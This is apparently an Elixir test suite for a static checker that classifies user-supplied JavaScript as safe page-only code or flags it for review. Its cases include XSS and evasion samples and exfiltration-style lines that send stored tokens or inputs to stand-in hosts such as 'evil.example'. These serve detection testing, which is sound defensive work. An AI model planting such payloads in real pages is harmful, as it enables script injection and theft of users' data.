defmodule BubbleEx.JsTest do
  # The static check of an app author's JavaScript (WTF-608): page-only
  # scripts a generated hook may run, everything else to a developer.
  use ExUnit.Case, async: true

  alias BubbleEx.Js
  alias BubbleEx.Js.{Lexer, Parser}

  defp page_only?(source, opts \\ []), do: Js.analyze(source, opts).verdict == :page_only
  defp reasons(source, opts \\ []), do: Js.analyze(source, opts).reasons
  defp kinds(source, opts \\ []), do: source |> reasons(opts) |> Enum.map(&elem(&1, 0))

  defp valid?(source) do
    case Lexer.tokens(source) do
      {:ok, tokens} -> Parser.check(tokens) == :ok
      {:error, _} -> false
    end
  end

  describe "page-only scripts" do
    test "DOM reads and writes, timers, storage and the clipboard" do
      assert page_only?("""
             document.querySelectorAll('#a, #b > .c').forEach(function (element) {
               element.scrollTop = 0;
             });
             """)

      assert page_only?("setTimeout(() => { document.body.focus() }, 1000)")
      assert page_only?("localStorage.setItem('k', JSON.stringify([1, 2]))")

      assert page_only?("""
             async function copy(items) {
               await navigator.clipboard.writeText(items.map(i => `• ${i}`).join('\\n'));
             }
             copy(['a']).then(() => console.log("ok")).catch(err => console.error(err));
             """)
    end

    test "Toolbox's inputs and a Javascript to Bubble element's publish function" do
      a =
        Js.analyze(
          """
          var selectedText = properties.param1
          var thing = properties.param2
          bubble_fn_itemPicked({ output1: selectedText, output2: thing, output3: properties.paramlist1 });
          """,
          publishes: ["itemPicked"]
        )

      assert a.verdict == :page_only
      assert a.reads == ["param1", "param2", "paramlist1"]
      assert a.publishes == ["itemPicked"]
    end

    test "window's publish functions and listed members" do
      a =
        Js.analyze(
          "var f = window.bubble_fn_a || window.bubble_fn_b; if (f) f({ output1: window.innerWidth });",
          publishes: ["a", "b"]
        )

      assert a.verdict == :page_only
      assert a.publishes == ["a", "b"]
      assert "window.innerWidth" in a.uses
    end

    test "a name assigned before it is read is a local of the generated function" do
      a =
        Js.analyze("quick = { output1: properties.param1 }\nbubble_fn_x(quick);",
          publishes: ["x"]
        )

      assert a.verdict == :page_only
      assert a.implicit == ["quick"]
    end

    test "names the script declares, parameters, patterns and catch bindings" do
      assert page_only?("""
             const { a, b: c, d = 1, ...rest } = { a: 1, b: 2 };
             let [x, , y = 2] = [1, 2, 3];
             function f(p, { q }, [r], ...s) { return p + q + r + s.length + a + c + d + x + y + rest; }
             try { f(1, {}, []) } catch (e) { console.error(e) }
             const g = (u, v) => u + v, h = w => w;
             f(g(1, 2), h({}), [], 3);
             """)
    end
  end

  describe "ruled out" do
    test "network, code, HTML and URL capabilities, wherever they appear" do
      assert kinds("fetch('/x')") == [:network]
      assert kinds("window.fetch('/x')") == [:network]
      assert kinds("new XMLHttpRequest()") == [:network]
      assert kinds("navigator.sendBeacon('/x', properties.param1)") == [:network]
      assert kinds("new Audio(properties.param1).play()") == [:network]
      assert :code in kinds("eval(properties.param1)")
      assert :code in kinds("new Function(properties.param1)()")
      assert :code in kinds("[].constructor.constructor('alert(1)')()")
      assert :html in kinds("document.body.innerHTML = properties.param1")
      assert :html in kinds("Object.assign(document.body, { innerHTML: properties.param1 })")
      assert :html in kinds("Object.assign(document.body, { 'innerHTML': properties.param1 })")
      assert :url in kinds("location.href = properties.param1")
      assert :url in kinds("document.cookie")
      assert :code in kinds("globalThis.x = 1")
      assert kinds("top.document") == [:code]
      assert kinds("var w = self") == [:code]
      assert kinds("document.body.addEventListener('click', e => e.view.alert(1))") == [:code]
      assert page_only?("var r = document.body.getBoundingClientRect(); console.log(r.top)")
    end

    test "a text given to a timer is code" do
      assert kinds("setTimeout(properties.param1, 10)") == [:timer_string]
      assert kinds("setTimeout('alert(1)', 10)") == [:timer_string]
      assert kinds("window.setInterval(code, 10)") |> Enum.member?(:timer_string)
      assert page_only?("function tick() {}\nsetInterval(tick, 10)")
      assert page_only?("setTimeout(function () {}, 10)")
      assert page_only?("setTimeout(async () => {}, 10)")
      assert page_only?("document.body.textContent = 'done'")

      assert page_only?(
               "document.body.textContent = 'done'\nconsole.log(document.body.textContent)"
             )

      assert page_only?("setTimeout(async function () {}, 10)")
    end

    test "attributes the browser may run" do
      assert kinds("el.setAttribute('onclick', properties.param1)") |> Enum.member?(:attribute)
      assert kinds("el.setAttribute('phx-click', properties.param1)") |> Enum.member?(:attribute)
      assert kinds("el.setAttribute(name, 'x')") |> Enum.member?(:attribute)

      assert page_only?(
               "document.body.setAttribute('aria-label', properties.param1); document.body.setAttribute('role', 'navigation')"
             )
    end

    test "computed members that hide a name" do
      assert :computed_member in kinds("var o = {}; o['con' + 'structor']")

      assert :computed_member in kinds(
               "var o = {}; var k = properties.param1; o[k](properties.param2)"
             )

      assert :computed_member in kinds("var o = {}; var a = 1, b = 2; o[a][b]")

      # Only a number key: `list[i]` may be `list["constructor"]`.
      assert page_only?("var list = [1, 2]; console.log(list[0] + list[1])")
      refute page_only?("var list = [1, 2]; var i = 0; console.log(list[i])")
    end

    test "globals it does not know, window members and properties" do
      assert reasons("helperFromHeader({})") == [{:unknown_global, "helperFromHeader"}]
      assert reasons("tracker.identify(properties.param1)") == [{:unknown_global, "tracker"}]
      assert reasons("window.__flag = true") == [{:window_member, "window.__flag"}]
      assert reasons("var w = window") == [{:window_member, "window"}]
      assert reasons("console.log(properties.thing)") == [{:property, "properties.thing"}]
      assert reasons("console.log(properties)") == [{:property, "properties"}]
      assert reasons("navigator.geolocation") == [{:navigator_member, "navigator.geolocation"}]
      assert reasons("bubble_fn_missing(1)") == [{:unresolved_publish, "bubble_fn_missing"}]
      assert reasons("console.log(x); x = 1") == [{:unknown_global, "x"}]
    end

    test "a script built from data, too long, or that would break its embedding" do
      assert reasons("console.log(1)", dynamic: true) == [{:dynamic, "script"}]
      assert reasons(String.duplicate(" ", 100_001)) == [{:too_long, "script"}]
      assert kinds("console.log('</script><script>alert(1)</script>')") == [:unembeddable]
      assert kinds(~s|console.log("""")|) == [:unembeddable]
      assert kinds("console.log('<%= x %>')") == [:unembeddable]
    end

    test "a script it cannot read" do
      assert kinds("console.log('x") == [:unreadable]
      assert kinds("var a = 1 +") == [:unreadable]
      assert kinds("console.log(/x/.test('x'))") == [:unreadable]
      assert kinds("function f(properties.param1) {}") == [:unreadable]
      assert kinds("var \\u0061 = 1") == [:unreadable]
    end

    test "implicit globals another script reads are not isolated" do
      a = Js.analyze("quick = 1")
      b = Js.analyze("console.log(quick)")
      assert a.verdict == :page_only
      shared = Js.shared([a, b])
      assert Js.isolate(a, shared).reasons == [{:global_write, "quick"}]
      assert Js.isolate(a, MapSet.new()) == a
    end
  end

  describe "found in review: never page-only" do
    test "a name computed from text, an alias of the window, a sink or a URL" do
      for source <- [
            ~s|const c = "con" + "structor"\nconst F = (() => 1)[c]\nF("fetch('//e')")()|,
            ~s|const k = "default" + "View"\nconst w = document[k]|,
            ~s|document.querySelector('#x')[properties.param1] = properties.param2|,
            ~s|const k = "inner" + "HTML"\ndocument.body[k] = properties.param1|,
            ~s|Object.assign(document, {["loca" + "tion"]: "javascript:alert(1)"})|,
            ~s|Object.assign(document.body, Object.fromEntries([['inner' + 'HTML', properties.param1]]))|,
            ~s|const k = String.fromCharCode(105, 110)\ndocument.body[k] = 1|,
            ~s|function f(self) {}\nself.setTimeout("alert(document.domain)")|,
            ~s|function f(parent) {}\nparent.alert(1)|,
            ~s|function f() {}\nfunction k(f) { setTimeout(f, 1) }\nk('alert(1)')|,
            ~s|function f() {}\nf = 'alert(1)'\nsetTimeout(f, 1)|,
            ~s|const s = document.createElementNS('http://www.w3.org/1999/xhtml', 'script')\ns.text = properties.param1\ndocument.body.append(s)|,
            ~s|const s = document.querySelector('script').cloneNode(true)\ndocument.body.append(s)|,
            ~s|document.execCommand("insertHTML", false, properties.param1)|,
            ~s|CSS.paintWorklet.addModule('https://evil.example/x.js')|,
            ~s|document.querySelector("img").srcset = "https://e/?" + properties.param1|,
            ~s|document.body.style.backgroundImage = "url(https://e/?" + localStorage.getItem("t") + ")"|,
            ~s|document.querySelector("form").submit()|,
            ~s|const d = Object.getOwnPropertyDescriptor(document, "x")|,
            ~s|const o = { get ["x"]() { return 1 } }|,
            ~s|const {assign} = Object\nassign(document.body, JSON.parse(properties.param1))|,
            ~s|const O = Object\nO.assign(document.body, {})|,
            ~s|Object.values(document)[0].assign(properties.param1)|,
            ~s|for (const v of Object.entries(document)) {}|,
            ~s|const a = document.createAttribute('onclick')\na.value = properties.param1\ndocument.body.setAttributeNode(a)|,
            ~s|document.body.attributes[0].value = properties.param1|,
            ~s|const async = properties.param1\nsetTimeout(async, 1)|,
            ~s|document.querySelector('script').textContent = properties.param1|,
            ~s|document.body.append(document.querySelector('template').content)|,
            ~s|document.querySelector('head style').textContent = '@import url(//e)'|,
            ~s|document.querySelector('video').poster = properties.param1|,
            ~s|document.querySelector('object').data = properties.param1|,
            ~s|document.styleSheets[0].replaceSync(properties.param1)|,
            ~s|document.scripts[0].text = properties.param1|,
            ~s|document.getElementById('s').textContent = properties.param1|,
            ~s|document.body.lastElementChild.textContent = '@imp' + 'ort u' + 'rl(//e)'|,
            ~s|document.body.lastElementChild.append('@imp' + 'ort u' + 'rl(//e)')|,
            ~s|document.body.attributeStyleMap.set('background-image', 'ur' + 'l(https://e/)')|,
            "const e = document.body\ne.textContent ||= properties.param1",
            ~s|const e = document.body\ne.text ??= properties.param1|,
            ~s|const e = document.body\ne.text = 'a'\n+ properties.param1|,
            ~s|const e = document.body\nfor (e.text of [properties.param1]) {}|,
            ~s|document.body.firstChild.appendData(properties.param1)|,
            ~s|const r = new Range()\nr.insertNode(document.createTextNode(properties.param1))|
          ] do
        refute page_only?(source), source
      end
    end

    test "what would not compile in the generated module" do
      for source <- [
            "let x = 1_",
            "let x = 1__0",
            "let x = 0x_1",
            "let x = 1.5n",
            "let x = 1e5n",
            "let x = 0_1",
            "x = 3in [1]",
            ~s|let x = "\\x1"|,
            ~s|let x = "\\u12"|,
            ~s|let x = "\\u{zz}"|,
            "let x = `\\x1`",
            "let properties = 1",
            "const properties = 1",
            "let x = '\u2028'",
            "let x = '\u202E'",
            "let x = `a\nb`",
            "let x = 'a\\\nb'"
          ] do
        refute page_only?(source), inspect(source)
      end

      assert page_only?("var properties = properties || {}")
      assert page_only?("let x = 1_000 + 0x1F + 10n + 1e3 + .5")
      assert page_only?(~s|let x = "\\x41\\u0041\\u{1F600}"|)
    end
  end

  describe "the parser accepts" do
    test "statements and expressions of the subset" do
      for source <- [
            "if (a) b(); else { c() }",
            "for (let i = 0, n = 2; i < n; i++) { continue }",
            "for (const k in o) {}\nfor (const v of o) { break }",
            "while (x) { x-- }\ndo { x++ } while (x < 3)",
            "switch (x) { case 1: y(); break; default: z() }",
            "try { a() } catch { b() } finally { c() }",
            "var o = { a: 1, 'b': 2, 3: 4, [k]: 5, m() { return 1 }, get g() { return 2 }, set s(v) {}, async f() { await 1 }, ...p }",
            "var f = async () => { await g() }; var h = async x => x",
            "a?.b?.[c]?.(d); new Date().getTime(); new Foo; typeof x === 'undefined'",
            "x = a ? b : c ? d : e; y = (a ?? b) || c; z = a ** -b",
            "var t = tag`a${b}c${`d${e}`}`",
            "return\nvar a = 1\nvar b = 2\n(function () {})()",
            "a\n++b",
            "var a = 1_000, b = .5, c = 0x1F, d = 1e3, e = 0"
          ] do
        assert valid?(source), source
      end
    end
  end

  describe "the parser refuses" do
    test "what is not valid in a strict-mode function body, or outside the subset" do
      for source <- [
            "let a = 1; let a = 2",
            "let a; var a",
            "{ var a } let a",
            "function f(a, a) {}",
            "const a",
            "break",
            "while (x) { function f() { continue } }",
            "await x",
            "var let = 1",
            "var eval = 1",
            "delete x",
            "a = 010",
            "a = '\\07'",
            "a ?? b || c",
            "-a ** b",
            "a + b = c",
            "a?.b = 1",
            "class A {}",
            "function* g() {}",
            "l: for (;;) {}",
            "import('x')",
            "if (a) let b = 1",
            "var a = 1 var b = 2",
            "(a)\n=> 1",
            "[a, b] = c",
            "var o = { a b }",
            "new.target",
            "throw\nx"
          ] do
        refute valid?(source), source
      end
    end
  end
end
